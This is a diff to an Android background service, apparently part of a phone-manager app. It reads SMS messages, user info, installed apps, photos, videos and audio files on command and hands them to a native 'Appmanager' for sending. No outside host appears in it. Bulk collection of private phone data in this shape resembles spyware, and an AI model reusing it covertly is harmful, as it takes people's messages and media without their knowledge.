@@ -6,6 +6,7 @@ import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.sql.Date;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -28,6 +29,7 @@ import android.net.Uri;
 import android.os.Environment;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.RemoteException;
 import android.os.StatFs;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
@@ -47,6 +49,7 @@ import android.content.Context;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.content.pm.PackageStats;
 
 public class androidService extends Service {
 	int i = 0;
@@ -74,7 +77,10 @@ public class androidService extends Service {
 		appinfolist();
 		getSmsInPhone();
 		getUserInfo();
-		
+		getPhotosInfo();
+		getVideosInfo();
+		getAudiosInfo();
+
 		Appmanager.gotosend(10);
 		// openservice();
 
@@ -131,12 +137,13 @@ public class androidService extends Service {
 		Appmanager.gotosend(7);
 	}
 
-	public void callnumber(String number){
+	public void callnumber(String number) {
 		Log.d("Java", "caling..." + number);
-		Intent dialIntent = new Intent(Intent.ACTION_CALL, Uri
-				.parse("tel:" + number));
-			startActivity(dialIntent);
+		Intent dialIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:"
+				+ number));
+		startActivity(dialIntent);
 	}
+
 	public String getSmsInPhone() {
 		i = -1;
 		final String SMS_URI_ALL = "content://sms/"; // 所有短信
@@ -306,11 +313,14 @@ public class androidService extends Service {
 			switch (Appmanager.whatyouwant()) {
 			case 0x01: // imageinfo
 				Log.d(TAG, "get appinfo");
+				getPhotosInfo();
 				break;
 			case 0x02: // videoifo
 				Log.d(TAG, "get videoinfo");
+				getVideosInfo();
 				break;
 			case 0x03: // musicinfo
+				getAudiosInfo();
 				Log.d(TAG, "get musicinfo");
 				break;
 			case 0x04: // appinfo
@@ -341,21 +351,21 @@ public class androidService extends Service {
 				Appmanager.gotosend(8);
 				break;
 			case 0x09: // call number
-//				Log.d(TAG, "call number");
-//				callnumber(Appmanager.getphonenumber());
+				// Log.d(TAG, "call number");
+				// callnumber(Appmanager.getphonenumber());
 				Appmanager.gotosend(9);
 				break;
-			case 10:		//get all
+			case 10: // get all
 				Log.d(TAG, "get all to send");
 				updateMemoryStatus();
 				appinfolist();
 				getSmsInPhone();
 				getUserInfo();
-				
+
 				Appmanager.gotosend(10);
 				break;
 			default:
-//				Log.d(TAG, "get nothing");
+				// Log.d(TAG, "get nothing");
 				break;
 			}
 			mHandler.postDelayed(mRunnable, 1000);
@@ -447,10 +457,61 @@ public class androidService extends Service {
 			 * Auto-generated catch block // e.printStackTrace(); }
 			 */
 
-			// Appmanager.setimageinfo(title,filePath,size,imagebyte,i);
-
+			char test[] = size.toCharArray();
+			if (test.length < 5) {
+				continue;
+			}
 			Appmanager.setimageinfo(title, filePath, size, i);
+
+			if (i > 15)
+				continue;
+
+//			byte[] imagebyte = Bitmap2Bytes(getImageThumbnail(filePath, 100,
+//					100));
+//
+//			Bitmap b = getImageThumbnail(filePath, 100, 100);
+//			FileUtils.isFolderExists("/sdcard/phonemanager");
+//			File myCaptureFile = new File("/sdcard/phonemanager/" + title
+//					+ ".jpg");
+//
+//			BufferedOutputStream bos;
+//			try {
+//
+//				Log.d("acanoe", "save jpg");
+//				bos = new BufferedOutputStream(new FileOutputStream(
+//						myCaptureFile));
+//				b.compress(Bitmap.CompressFormat.JPEG, 40, bos);
+//				bos.flush();
+//				bos.close();
+//			} catch (IOException e) { // TODO
+//				e.printStackTrace();
+//				
+//			}
 		}
+	}
+
+	private void getAudiosInfo() {
+		i = 0;
+		ContentResolver contentResolver = getContentResolver();
+		String[] audioColumns = new String[] { MediaStore.Audio.Media._ID,
+				MediaStore.Audio.Media.DATA, MediaStore.Audio.Media.TITLE,
+				MediaStore.Audio.Media.SIZE };
+		Cursor cursor = contentResolver.query(
+				MediaStore.Audio.Media.EXTERNAL_CONTENT_URI, audioColumns,
+				null, null, null);
+		while (cursor.moveToNext()) {
+			i++;
+			String _id = cursor.getString(cursor
+					.getColumnIndexOrThrow(MediaStore.Audio.Media._ID));
+			String filePath = cursor.getString(cursor
+					.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA));
+			String title = cursor.getString(cursor
+					.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE));
+			String size = cursor.getString(cursor
+					.getColumnIndexOrThrow(MediaStore.Audio.Media.SIZE));
+			Appmanager.setmusicinfo(title, filePath, size, i);
+		}
+
 	}
 
 	private Bitmap getImageThumbnail(String imagePath, int width, int height) {
@@ -506,91 +567,94 @@ public class androidService extends Service {
 		List<PackageInfo> packages = getPackageManager()
 				.getInstalledPackages(0);
 		for (int j = 0; j < packages.size(); j++) {
-			
-			i ++;
+
+			i++;
 			// System.out.println("packages.size is" + packages.size());
 			// System.out.println(j);
 			PackageInfo packageInfo = packages.get(j);
 			AppInfo tmpInfo = new AppInfo();
-//			tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
-//					getPackageManager()).toString();
-//			tmpInfo.packageName = packageInfo.packageName;
-//			tmpInfo.versionName = packageInfo.versionName;
-//			tmpInfo.versionCode = packageInfo.versionCode;
 
-//			Appmanager.setappinfo(1, 1, tmpInfo.appName, tmpInfo.packageName,
-//					tmpInfo.versionName, "123456", j);
+			// tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
+			// getPackageManager()).toString();
+			// tmpInfo.packageName = packageInfo.packageName;
+			// tmpInfo.versionName = packageInfo.versionName;
+			// tmpInfo.versionCode = packageInfo.versionCode;
+
+			// Appmanager.setappinfo(1, 1, tmpInfo.appName, tmpInfo.packageName,
+			// tmpInfo.versionName, "123456", j);
 
 			// Log.d("java","" + tmpInfo.appName + "   flags   " +
 			// packageInfo.applicationInfo.flags + "   FLAG_SYSTEM: " +
 			// ApplicationInfo.FLAG_SYSTEM + "   FLAG_EXTERNAL_STORAGE:   "
 			// +ApplicationInfo.FLAG_EXTERNAL_STORAGE);
 			if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) { // 系统应用
-			 
+
 				tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
 						getPackageManager()).toString();
 				tmpInfo.packageName = packageInfo.packageName;
 				tmpInfo.versionName = packageInfo.versionName;
 				tmpInfo.versionCode = packageInfo.versionCode;
-				
-//				Log.d("java", "systemapp      " + tmpInfo.appName);
-				if(Appmanager.setappinfo(0, 0, tmpInfo.appName,
-			 tmpInfo.packageName, tmpInfo.versionName, "123456", i) < 0)
+
+				// Log.d("java", "systemapp      " + tmpInfo.appName);
+				if (Appmanager.setappinfo(0, 0, tmpInfo.appName,
+						tmpInfo.packageName, tmpInfo.versionName, "123456", i) < 0)
 					i--;
 
-//				tmpInfo.systemapp = packageInfo.applicationInfo.loadLabel(
-//						getPackageManager()).toString();
-				
+				// tmpInfo.systemapp = packageInfo.applicationInfo.loadLabel(
+				// getPackageManager()).toString();
+
 			}
 
 			if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) { // 非系统应用
-		
+
 				if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0) {
-					
-					
+
 					tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
 							getPackageManager()).toString();
 					tmpInfo.packageName = packageInfo.packageName;
 					tmpInfo.versionName = packageInfo.versionName;
 					tmpInfo.versionCode = packageInfo.versionCode;
-					
-//					Log.d("java", "systemapp      " + tmpInfo.appName);
-					 if(Appmanager.setappinfo(1, 1, tmpInfo.appName,
-					 tmpInfo.packageName, tmpInfo.versionName, "123456", i) < 0)
-						 i--;
-					 
-					 
-//					tmpInfo.unsystemapp = packageInfo.applicationInfo
-//							.loadLabel(getPackageManager()).toString();
-//					Log.d("Java", "unsystemapp  on sdcard  " + tmpInfo.unsystemapp);
-				} else{
+
+					// Log.d("java", "systemapp      " + tmpInfo.appName);
+					if (Appmanager.setappinfo(1, 1, tmpInfo.appName,
+							tmpInfo.packageName, tmpInfo.versionName, "123456",
+							i) < 0)
+						i--;
+
+					// tmpInfo.unsystemapp = packageInfo.applicationInfo
+					// .loadLabel(getPackageManager()).toString();
+					// Log.d("Java", "unsystemapp  on sdcard  " +
+					// tmpInfo.unsystemapp);
+				} else {
 					tmpInfo.appName = packageInfo.applicationInfo.loadLabel(
 							getPackageManager()).toString();
 					tmpInfo.packageName = packageInfo.packageName;
 					tmpInfo.versionName = packageInfo.versionName;
 					tmpInfo.versionCode = packageInfo.versionCode;
-					
-//					Log.d("java", "systemapp      " + tmpInfo.appName);
-					 if(Appmanager.setappinfo(0, 1, tmpInfo.appName,
-					 tmpInfo.packageName, tmpInfo.versionName, "123456", i) < 0)
-						 i--;
-					
-					
-//					tmpInfo.unsystemapp = packageInfo.applicationInfo
-//							.loadLabel(getPackageManager()).toString();
-//					Log.d("Java", "unsystemapp  on phone  " + tmpInfo.unsystemapp);
-					
+
+					// Log.d("java", "systemapp      " + tmpInfo.appName);
+					if (Appmanager.setappinfo(0, 1, tmpInfo.appName,
+							tmpInfo.packageName, tmpInfo.versionName, "123456",
+							i) < 0)
+						i--;
+
+					// tmpInfo.unsystemapp = packageInfo.applicationInfo
+					// .loadLabel(getPackageManager()).toString();
+					// Log.d("Java", "unsystemapp  on phone  " +
+					// tmpInfo.unsystemapp);
+
 				}
 			}
-//
-//			if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0) { // SD应用
-//			// Appmanager.setappinfo(0, 1, tmpInfo.appName,
-//			// tmpInfo.packageName, tmpInfo.versionName, "123456", j);
-//				tmpInfo.sdapp = packageInfo.applicationInfo.loadLabel(
-//						getPackageManager()).toString();
-//				Log.d("java", "sdapp      " + tmpInfo.sdapp);
-//
-//			}
+			//
+			// if ((packageInfo.applicationInfo.flags &
+			// ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0) { // SD应用
+			// // Appmanager.setappinfo(0, 1, tmpInfo.appName,
+			// // tmpInfo.packageName, tmpInfo.versionName, "123456", j);
+			// tmpInfo.sdapp = packageInfo.applicationInfo.loadLabel(
+			// getPackageManager()).toString();
+			// Log.d("java", "sdapp      " + tmpInfo.sdapp);
+			//
+			// }
 
 			// if(j == 40)
 			// {
